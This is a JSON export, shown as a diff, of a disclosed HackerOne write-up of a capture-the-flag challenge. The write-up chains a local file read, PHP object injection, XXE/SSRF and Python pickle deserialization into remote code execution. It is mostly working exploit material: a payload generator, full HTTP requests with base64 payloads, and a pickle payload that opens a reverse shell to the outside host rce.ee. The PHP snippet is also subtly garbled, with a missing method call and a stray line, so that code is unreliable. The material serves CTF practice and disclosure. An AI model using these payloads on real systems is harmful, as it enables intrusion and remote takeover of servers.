@@ -1,0 +1,153 @@
+{
+  "id": 415501,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTU1MDE=",
+  "url": "https://hackerone.com/reports/415501",
+  "title": "RCE via Local File Read -> php unserialization-> XXE -> unpickling",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-09-28T01:04:15.800Z",
+  "submitted_at": "2018-09-28T01:04:15.800Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "iamnoooob",
+    "url": "/iamnoooob",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/006/641/bac85609c25156d5984adc4ab39ab4e57f63e8c0_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 33314,
+    "url": "https://hackerone.com/h1-5411-ctf",
+    "handle": "h1-5411-ctf",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/033/314/9e31bd74c6486465dd01f5ef0a98eb4ebe1b6459_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/033/314/9e31bd74c6486465dd01f5ef0a98eb4ebe1b6459_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "h1-5411-CTF",
+      "twitter_handle": null,
+      "website": "http://tbd.com",
+      "about": null
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-10-22T16:01:36.514Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-10-08T17:21:54.656Z",
+  "team_member_agreed_on_going_public_at": "2018-10-22T16:01:36.433Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** \nIt was possible to escalate to Remote Code Execution via different bugs such as local file read, php object injection, XML External Entity and Un-Pickling of Python serialized object.\n \n**Description:** \nUsing local file read it was discovered that the php code was vulnerable to php object injection and a class could be used to cause XXE which inturn helped to access internal service running on the machine using SSRF(via XXE) on port 1337  which on further investigation was vulnerable to unpickling and thus lead to remote code execution by creating a crafted searlized Pickle.\n\n## Steps To Reproduce:\nThe Road to flag had the following Chain of bugs required: \n1.LFR\n2.PHP Object Injection\n3.XXE\n4.Python Pickle De-Serialization\n5.Flag\n\n##1.LFR\nwhile generating memes on https://h1-5411.h1ctf.com/generate.php# It was found that the request to generate a meme from text templates allowed to include arbitrary files and save it to a randomly generated file to a fixed path. The template parameter of this request suffered from Local File Read.\n\nRequest:\n\n~~~\nPOST /api/generate.php HTTP/1.1\nHost: h1-5411.h1ctf.com\nConnection: close\nContent-Length: 72\nAccept: */*\nOrigin: https://h1-5411.h1ctf.com\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer: https://h1-5411.h1ctf.com/generate.php\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,de;q=0.8\nCookie: PHPSESSID=\n\ntemplate=../../../../../../../etc/passwd&type=text&top-text=ad&bottom-text=asd\n~~~\n\nResponse:\n\n~~~\n{\n  \"meme_path\": \"../data/memes/1538093153-756c689bcd82668cd3114792ed5befefc1d489cb0c96ea6b7d13051329c0d918.txt\"\n}\n~~~\n\nUpon visiting the /data/memes/1538093153-756c689bcd82668cd3114792ed5befefc1d489cb0c96ea6b7d13051329c0d918.txt the contents of /etc/passwd could be seen.\n\n{F352169}\n\nWith the help of this local file read, we were able to read the content of server side php files.\nAfter analyzing the config.php we came to know about various different files like includes/header.php,includes/classes.php etc the source of header.php gave us further two new php files /api/export_memes_2.0.php and /api/import_memes_2.0.php. \n\nOn auditing includes/classes.php we found that function parse() was vulnerable to XXE however the function resides in a class (ConfigFile) which is not getting initiated in any of the file we audited.\n\nReading the source code of /api/{export,import}_memes_2.0.php files showed the usage of php unserialization (vulnerable) during import via userinput in a $_FILES['f'] parameter which was further stored in $_SESSION['memes'] as an array and serialization during export.\n\n##2. PHP Object Injection & 3. XXE\n\nThe ConfigFile Class had a magic method __toString() which is called whenever the object of ConfigFile Class is echo'ed or used a string. That __toString() method also calls the parser() function which is vulnerable to XXE. the Parser function takes a property \"config_raw\" which is an XML string to be parsed. Now all we have to discover is some place where that object is echo'd or used a string such as concatenation etc., it was found that /memes.php had a for loop which would just simply loop over $_SESSION['memes'] and echo each value in the array. so If we get our object to be placed in $_SESSION['memes'] it will be echoed and __toString() magic method will be invoked calling out parser() function which is further vulnerable to XXE and will help to access internally running services using SSRF.\n\n{F352171}\n\nUsing the Unserialize() call in import_memes_2.0.php we were able to craft payload leading to XXE(SSRF). We made a quick php script for generating it easily \n\n~~~\n<?php\n//ex- usage php exploit.php http://localhost\nclass ConfigFile{\n\n    function __construct($url) {\n      $this->config_raw = file_get_contents($url);\n    }\n\n    function parse() {\n     echo \"i was called\";  \n$dom = new DOMDocument();\n      $dom->  ($this->config_raw, LIBXML_NOENT | LIBXML_DTDLOAD);\n      $o = simplexml_import_dom($dom);\nshould we\n      $this->top_text = $o->toptext;\n      $this->bottom_text = $o->bottomtext;\n      $this->template = $o->template;\n      $this->type = $o->type;\n  }\n\n    function __toString() {\n        $this->parse();\n        echo $this->template;\n        return \"I am a stirng\";\n}\n}\n$obj=new ConfigFile('<root></root>');\n$obj->config_raw='<?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"'.$argv[1].'\" >]><note><toptext>Tove</toptext><bottomtext>Jani</bottomtext><type>Reminder</type><template>&xxe;</template></note>';\n$arr=[$obj];\necho base64_encode(serialize($arr));\necho \"\\n\";\n~~~\n\nJust copy the payload and use it in the following request\n\n~~~\nPOST /api/import_memes_2.0.php HTTP/1.1\nHost: h1-5411.h1ctf.com\nConnection: close\nContent-Length: 610\nCache-Control: max-age=0\nOrigin: https://h1-5411.h1ctf.com\nUpgrade-Insecure-Requests: 1\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryi9X2MAeAOhvJm616\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nReferer: https://h1-5411.h1ctf.com/import_memes_2.0.php\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,de;q=0.8\nCookie: PHPSESSID=78cvqcb3qbphjc2rkdo9r5tbug\n\n------WebKitFormBoundaryi9X2MAeAOhvJm616\nContent-Disposition: form-data; name=\"f\"; filename=\"1538079414_export.memepak\"\nContent-Type: application/octet-stream\n\nYToxOntpOjA7TzoxMDoiQ29uZmlnRmlsZSI6MTp7czoxMDoiY29uZmlnX3JhdyI7czoyMzk6Ijw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ij8+IDwhRE9DVFlQRSBmb28gWzwhRUxFTUVOVCBmb28gQU5ZID48IUVOVElUWSB4eGUgU1lTVEVNICJodHRwOi8vbG9jYWxob3N0OjEzMzcvc3RhdHVzIiA+XT48bm90ZT48dG9wdGV4dD5Ub3ZlPC90b3B0ZXh0Pjxib3R0b210ZXh0Pkphbmk8L2JvdHRvbXRleHQ+PHR5cGU+UmVtaW5kZXI8L3R5cGU+PHRlbXBsYXRlPiZ4eGU7PC90ZW1wbGF0ZT48L25vdGU+Ijt9fQ==\n------WebKitFormBoundaryi9X2MAeAOhvJm616--\n\n\n~~~\n\nwhere the request is base64 encoded version of this serialized object \n\n~~~\na:1:{i:0;O:10:\"ConfigFile\":1:{s:10:\"config_raw\";s:239:\"<?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://localhost:1337/\" >]><note><toptext>Tove</toptext><bottomtext>Jani</bottomtext><type>Reminder</type><template>&xxe;</template></note>\";}}\n~~~\n\nTo view the results of the XXE visit /memes.php where the object is echo'ed calling the __toString() magic method.\n\n{F352167}\n\n##3 Un-Pickling  \nIt was discovered that 1337 port on localhost was running a maintenance api which had 2 endpoints /status and /update-status and a debug parameter which on requesting gives some information about the request such as debug & status parameter. It was found that update-status also takes a 'status' parameter to change the maintenance mode from off to on or vice versa. Request to this endpoint along with 'debug=1' parameter set gives a base64 encoded string which on decoding seemed to be a Python Pickle Serialized Object. Next we just used the following code snippet to create a base64 encoded pickle object which executes a reverse shell to our VPS\n\n~~~\nimport cPickle\nimport sys\nimport base64\n\nDEFAULT_COMMAND = \"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"rce.ee\\\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\"\nCOMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND\n\nclass PickleRce(object):\n    def __reduce__(self):\n        import os\n        return (os.system,(COMMAND,))\n\nprint base64.b64encode(cPickle.dumps(PickleRce()))\n~~~\n\nwe listened for a netcat session on our server and the final request was sent:\n\n~~~\nPOST /api/import_memes_2.0.php HTTP/1.1\nHost: h1-5411.h1ctf.com\nConnection: close\nContent-Length: 1094\nCache-Control: max-age=0\nOrigin: https://h1-5411.h1ctf.com\nUpgrade-Insecure-Requests: 1\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryi9X2MAeAOhvJm616\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nReferer: https://h1-5411.h1ctf.com/import_memes_2.0.php\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,de;q=0.8\nCookie: PHPSESSID=78cvqcb3qbphjc2rkdo9r5tbug\n\n------WebKitFormBoundaryi9X2MAeAOhvJm616\nContent-Disposition: form-data; name=\"f\"; filename=\"1538079414_export.memepak\"\nContent-Type: application/octet-stream\n\nYToxOntpOjA7TzoxMDoiQ29uZmlnRmlsZSI6MTp7czoxMDoiY29uZmlnX3JhdyI7czo2MDI6Ijw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ij8+IDwhRE9DVFlQRSBmb28gWzwhRUxFTUVOVCBmb28gQU5ZID48IUVOVElUWSB4eGUgU1lTVEVNICJodHRwOi8vbG9jYWxob3N0OjEzMzcvdXBkYXRlLXN0YXR1cz9zdGF0dXM9WTNCdmMybDRDbk41YzNSbGJRcHdNUW9vVXlkd2VYUm9iMjRnTFdNZ1hDZHBiWEJ2Y25RZ2MyOWphMlYwTEhOMVluQnliMk5sYzNNc2IzTTdjejF6YjJOclpYUXVjMjlqYTJWMEtITnZZMnRsZEM1QlJsOUpUa1ZVTEhOdlkydGxkQzVUVDBOTFgxTlVVa1ZCVFNrN2N5NWpiMjV1WldOMEtDZ2ljbU5sTG1WbElpdzBORE1wS1R0dmN5NWtkWEF5S0hNdVptbHNaVzV2S0Nrc01DazdJRzl6TG1SMWNESW9jeTVtYVd4bGJtOG9LU3d4S1RzZ2IzTXVaSFZ3TWloekxtWnBiR1Z1YnlncExESXBPM0E5YzNWaWNISnZZMlZ6Y3k1allXeHNLRnNpTDJKcGJpOXphQ0lzSWkxcElsMHBPMXduSndwd01ncDBVbkF6Q2k0PSZkZWJ1Zz0xIiA+XT48bm90ZT48dG9wdGV4dD5Ub3ZlPC90b3B0ZXh0Pjxib3R0b210ZXh0Pkphbmk8L2JvdHRvbXRleHQ+PHR5cGU+UmVtaW5kZXI8L3R5cGU+PHRlbXBsYXRlPiZ4eGU7PC90ZW1wbGF0ZT48L25vdGU+Ijt9fQ==\n------WebKitFormBoundaryi9X2MAeAOhvJm616--\n~~~\n\nwhich decodes to \n\n~~~\na:1:{i:0;O:10:\"ConfigFile\":1:{s:10:\"config_raw\";s:602:\"<?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://localhost:1337/update-status?status=Y3Bvc2l4CnN5c3RlbQpwMQooUydweXRob24gLWMgXCdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgicmNlLmVlIiw0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pO1wnJwpwMgp0UnAzCi4=&debug=1\" >]><note><toptext>Tove</toptext><bottomtext>Jani</bottomtext><type>Reminder</type><template>&xxe;</template></note>\";}}\n~~~\n\nAnd we got a reverse shell and in the same directory (/app) we found flag.txt which said :) \n\n~~~\nYay! Here is your flag:\n\n\nflag{cha1n1ng_bugs_f0r_fun_4nd_pr0f1t?_or_rep0rt_an_LF1}\n\n\nGo to https://hackerone.com/h1-5411-ctf and submit your writeup! \n\n~~~\n\n{F352164}\n\n##Regards \nRahul Maini & Harsh Jaiswal (@bugdiscloseguys)\n\n## Impact\n\nRCE",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 352164,
+      "file_name": "Screenshot_27.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/164/d530c79b257a1ae01ad0ee8ac4dc88b1fbaafc84/Screenshot_27.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_27.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_27.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5HBVTKPC%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152323Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIQD8WGfYtEd%2F9%2Fq1%2FF5LEjtOMz%2B3Hk7B7PSA26pAw0wOswIgSLB0Ak9Xzn8kamhYvLrAVYYf%2FrsLhma2hpYiOuNE3F4quwUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDHTJz%2F4Rkmea5gbvSyqPBVlvmMh6da0rR0pEiw5w48eamBqCSL%2BzjsbZB%2Fi6tdMqbhmYmcqpJEF6MS%2FQPDMjSCs3l3nKJ9BYv1Vb%2B2w7lCx4AnmukaDD2GgIsQyoO9RlI8OE11JFAWErpLEqSrREFhkiOnlOpkX3SFRwLuQnpMFBUtfJ7yWP0U1qu9a4O5clZ8vCseIZIEkAWSr%2FQvnXY%2FfMsOf78iDsKnWazk%2BoNhAzFXmx%2BwxedzA7SkVG5D5xwr81CF9hlb%2Flg2EXFksZY81oTLts7t%2BbjX800M7aHz%2BtjXfthJ9pQs8hj9%2BQZfsxphdQ1XmkliU3eXwp3eO6L3b9xxv602sI8v4itSiYwwSZnobyU3sQ7cbEyiivnEUxkCGppJuPwWKKHTmloFU2XS18PlwwYZwEKODQ8%2BiurSGAwcUawSJR7aEvxRo%2B82yMa2qilMIgsU3iorw2Ivk1Dr76zH3JWx8NkORZzRZ81Pp39LHL2IIWHXo8ms1rCwvMjYXm6EDKeuTG%2B1nFW1l7cUIXNXSYxeLAyA7FJdMWhqVs1bQxHghx4JAFK5TlIlczgM05wEXZC42AtN4eDM3V9Is1w%2FsN1zTT%2BWGC1JuKbC2d7o2iGtrsIQA9xpGe97XJQKMSsZeqLQA%2BbkM0VwGKwzeqwD7OAOxStJ5BvgI%2F7aE2MsxK1O%2FT5kvdB%2F4lbFbvZ3dpjY4Ag4kpEEsHQabJyMR6W9OOxDBWcuBAY0%2Belv%2FWieQWlMWl1Nk6jC%2BJ7gfsT%2BmyKaDFF1oAqF3ymGtSiv7UwAp8AbqU8zE4QoyuxpaClHGlNxU8H63W8gIO1V7tkEk%2BoZ98Wr%2FojH2ZTBgmm6gkpCCk%2FKtxhrKq1xEfIBE3XvsFdHmHJfB3NTdSv58wvvj8zwY6sQGW7eLAvADLPqvI9%2BpfYkAuoC5na4%2FPfYBseB%2BMuPQSL2j4kTBcDYng6TRCbifuAN1yKY1qCeyUt2yeayi9ACBZDuFJcJMEn%2FRLT7x6PMvZoiX3olaC17XZgfRUQTQYBv1mUV1HNSjgeRi7m5dYpLTxjPGau9lEZUp0KwsHhXY%2BOv4DiWXvsnatZXP4DEIijMItprbrYRLuOhOGkUGAUypSNWuSW78PaQRu9vyBQ72f2HY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4bbf2fced276ee10b71173393e5ca25260f39a8a967ee61b06a98ec03dc963d2",
+      "file_size": 20961,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 352167,
+      "file_name": "Screenshot_28.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/167/8b54c831e709e334c4e681910a3bef943c101562/Screenshot_28.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_28.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_28.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5HBVTKPC%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152323Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIQD8WGfYtEd%2F9%2Fq1%2FF5LEjtOMz%2B3Hk7B7PSA26pAw0wOswIgSLB0Ak9Xzn8kamhYvLrAVYYf%2FrsLhma2hpYiOuNE3F4quwUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDHTJz%2F4Rkmea5gbvSyqPBVlvmMh6da0rR0pEiw5w48eamBqCSL%2BzjsbZB%2Fi6tdMqbhmYmcqpJEF6MS%2FQPDMjSCs3l3nKJ9BYv1Vb%2B2w7lCx4AnmukaDD2GgIsQyoO9RlI8OE11JFAWErpLEqSrREFhkiOnlOpkX3SFRwLuQnpMFBUtfJ7yWP0U1qu9a4O5clZ8vCseIZIEkAWSr%2FQvnXY%2FfMsOf78iDsKnWazk%2BoNhAzFXmx%2BwxedzA7SkVG5D5xwr81CF9hlb%2Flg2EXFksZY81oTLts7t%2BbjX800M7aHz%2BtjXfthJ9pQs8hj9%2BQZfsxphdQ1XmkliU3eXwp3eO6L3b9xxv602sI8v4itSiYwwSZnobyU3sQ7cbEyiivnEUxkCGppJuPwWKKHTmloFU2XS18PlwwYZwEKODQ8%2BiurSGAwcUawSJR7aEvxRo%2B82yMa2qilMIgsU3iorw2Ivk1Dr76zH3JWx8NkORZzRZ81Pp39LHL2IIWHXo8ms1rCwvMjYXm6EDKeuTG%2B1nFW1l7cUIXNXSYxeLAyA7FJdMWhqVs1bQxHghx4JAFK5TlIlczgM05wEXZC42AtN4eDM3V9Is1w%2FsN1zTT%2BWGC1JuKbC2d7o2iGtrsIQA9xpGe97XJQKMSsZeqLQA%2BbkM0VwGKwzeqwD7OAOxStJ5BvgI%2F7aE2MsxK1O%2FT5kvdB%2F4lbFbvZ3dpjY4Ag4kpEEsHQabJyMR6W9OOxDBWcuBAY0%2Belv%2FWieQWlMWl1Nk6jC%2BJ7gfsT%2BmyKaDFF1oAqF3ymGtSiv7UwAp8AbqU8zE4QoyuxpaClHGlNxU8H63W8gIO1V7tkEk%2BoZ98Wr%2FojH2ZTBgmm6gkpCCk%2FKtxhrKq1xEfIBE3XvsFdHmHJfB3NTdSv58wvvj8zwY6sQGW7eLAvADLPqvI9%2BpfYkAuoC5na4%2FPfYBseB%2BMuPQSL2j4kTBcDYng6TRCbifuAN1yKY1qCeyUt2yeayi9ACBZDuFJcJMEn%2FRLT7x6PMvZoiX3olaC17XZgfRUQTQYBv1mUV1HNSjgeRi7m5dYpLTxjPGau9lEZUp0KwsHhXY%2BOv4DiWXvsnatZXP4DEIijMItprbrYRLuOhOGkUGAUypSNWuSW78PaQRu9vyBQ72f2HY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=db9a75d14621631eab7cf589d05d498ff4ec7263a899780c8c94b7042cb43f0a",
+      "file_size": 67171,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 352169,
+      "file_name": "Screenshot_29.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/169/38f3a8da9f9e85b5635778dedfbafdb1d47282e8/Screenshot_29.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_29.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_29.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5HBVTKPC%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152323Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIQD8WGfYtEd%2F9%2Fq1%2FF5LEjtOMz%2B3Hk7B7PSA26pAw0wOswIgSLB0Ak9Xzn8kamhYvLrAVYYf%2FrsLhma2hpYiOuNE3F4quwUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDHTJz%2F4Rkmea5gbvSyqPBVlvmMh6da0rR0pEiw5w48eamBqCSL%2BzjsbZB%2Fi6tdMqbhmYmcqpJEF6MS%2FQPDMjSCs3l3nKJ9BYv1Vb%2B2w7lCx4AnmukaDD2GgIsQyoO9RlI8OE11JFAWErpLEqSrREFhkiOnlOpkX3SFRwLuQnpMFBUtfJ7yWP0U1qu9a4O5clZ8vCseIZIEkAWSr%2FQvnXY%2FfMsOf78iDsKnWazk%2BoNhAzFXmx%2BwxedzA7SkVG5D5xwr81CF9hlb%2Flg2EXFksZY81oTLts7t%2BbjX800M7aHz%2BtjXfthJ9pQs8hj9%2BQZfsxphdQ1XmkliU3eXwp3eO6L3b9xxv602sI8v4itSiYwwSZnobyU3sQ7cbEyiivnEUxkCGppJuPwWKKHTmloFU2XS18PlwwYZwEKODQ8%2BiurSGAwcUawSJR7aEvxRo%2B82yMa2qilMIgsU3iorw2Ivk1Dr76zH3JWx8NkORZzRZ81Pp39LHL2IIWHXo8ms1rCwvMjYXm6EDKeuTG%2B1nFW1l7cUIXNXSYxeLAyA7FJdMWhqVs1bQxHghx4JAFK5TlIlczgM05wEXZC42AtN4eDM3V9Is1w%2FsN1zTT%2BWGC1JuKbC2d7o2iGtrsIQA9xpGe97XJQKMSsZeqLQA%2BbkM0VwGKwzeqwD7OAOxStJ5BvgI%2F7aE2MsxK1O%2FT5kvdB%2F4lbFbvZ3dpjY4Ag4kpEEsHQabJyMR6W9OOxDBWcuBAY0%2Belv%2FWieQWlMWl1Nk6jC%2BJ7gfsT%2BmyKaDFF1oAqF3ymGtSiv7UwAp8AbqU8zE4QoyuxpaClHGlNxU8H63W8gIO1V7tkEk%2BoZ98Wr%2FojH2ZTBgmm6gkpCCk%2FKtxhrKq1xEfIBE3XvsFdHmHJfB3NTdSv58wvvj8zwY6sQGW7eLAvADLPqvI9%2BpfYkAuoC5na4%2FPfYBseB%2BMuPQSL2j4kTBcDYng6TRCbifuAN1yKY1qCeyUt2yeayi9ACBZDuFJcJMEn%2FRLT7x6PMvZoiX3olaC17XZgfRUQTQYBv1mUV1HNSjgeRi7m5dYpLTxjPGau9lEZUp0KwsHhXY%2BOv4DiWXvsnatZXP4DEIijMItprbrYRLuOhOGkUGAUypSNWuSW78PaQRu9vyBQ72f2HY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=856a342f02f10740fe24f25c65b871aac20a31d7b9fb90a910a2d84e8c8a6fb4",
+      "file_size": 41761,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 352171,
+      "file_name": "Screenshot_30.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/171/2eb2b99b8a8daebbc840868913cf55d848cb5dca/Screenshot_30.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_30.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_30.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5HBVTKPC%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152323Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIQD8WGfYtEd%2F9%2Fq1%2FF5LEjtOMz%2B3Hk7B7PSA26pAw0wOswIgSLB0Ak9Xzn8kamhYvLrAVYYf%2FrsLhma2hpYiOuNE3F4quwUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDHTJz%2F4Rkmea5gbvSyqPBVlvmMh6da0rR0pEiw5w48eamBqCSL%2BzjsbZB%2Fi6tdMqbhmYmcqpJEF6MS%2FQPDMjSCs3l3nKJ9BYv1Vb%2B2w7lCx4AnmukaDD2GgIsQyoO9RlI8OE11JFAWErpLEqSrREFhkiOnlOpkX3SFRwLuQnpMFBUtfJ7yWP0U1qu9a4O5clZ8vCseIZIEkAWSr%2FQvnXY%2FfMsOf78iDsKnWazk%2BoNhAzFXmx%2BwxedzA7SkVG5D5xwr81CF9hlb%2Flg2EXFksZY81oTLts7t%2BbjX800M7aHz%2BtjXfthJ9pQs8hj9%2BQZfsxphdQ1XmkliU3eXwp3eO6L3b9xxv602sI8v4itSiYwwSZnobyU3sQ7cbEyiivnEUxkCGppJuPwWKKHTmloFU2XS18PlwwYZwEKODQ8%2BiurSGAwcUawSJR7aEvxRo%2B82yMa2qilMIgsU3iorw2Ivk1Dr76zH3JWx8NkORZzRZ81Pp39LHL2IIWHXo8ms1rCwvMjYXm6EDKeuTG%2B1nFW1l7cUIXNXSYxeLAyA7FJdMWhqVs1bQxHghx4JAFK5TlIlczgM05wEXZC42AtN4eDM3V9Is1w%2FsN1zTT%2BWGC1JuKbC2d7o2iGtrsIQA9xpGe97XJQKMSsZeqLQA%2BbkM0VwGKwzeqwD7OAOxStJ5BvgI%2F7aE2MsxK1O%2FT5kvdB%2F4lbFbvZ3dpjY4Ag4kpEEsHQabJyMR6W9OOxDBWcuBAY0%2Belv%2FWieQWlMWl1Nk6jC%2BJ7gfsT%2BmyKaDFF1oAqF3ymGtSiv7UwAp8AbqU8zE4QoyuxpaClHGlNxU8H63W8gIO1V7tkEk%2BoZ98Wr%2FojH2ZTBgmm6gkpCCk%2FKtxhrKq1xEfIBE3XvsFdHmHJfB3NTdSv58wvvj8zwY6sQGW7eLAvADLPqvI9%2BpfYkAuoC5na4%2FPfYBseB%2BMuPQSL2j4kTBcDYng6TRCbifuAN1yKY1qCeyUt2yeayi9ACBZDuFJcJMEn%2FRLT7x6PMvZoiX3olaC17XZgfRUQTQYBv1mUV1HNSjgeRi7m5dYpLTxjPGau9lEZUp0KwsHhXY%2BOv4DiWXvsnatZXP4DEIijMItprbrYRLuOhOGkUGAUypSNWuSW78PaQRu9vyBQ72f2HY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2ae6161801e0fa8683695114235687ed68d0135d2fb7526e0d111515ce2b6e76",
+      "file_size": 46615,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-11-07T17:21:54.746Z",
+  "allow_singular_disclosure_after": -236728888.48450354,
+  "singular_disclosure_allowed": true,
+  "vote_count": 46,
+  "voters": [
+    "rootz491",
+    "roland_hack",
+    "0xacb",
+    "inhibitor181",
+    "ali",
+    "tess",
+    "sameerphad72",
+    "spam404",
+    "hackerhero",
+    "yinvi777",
+    "and 36 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
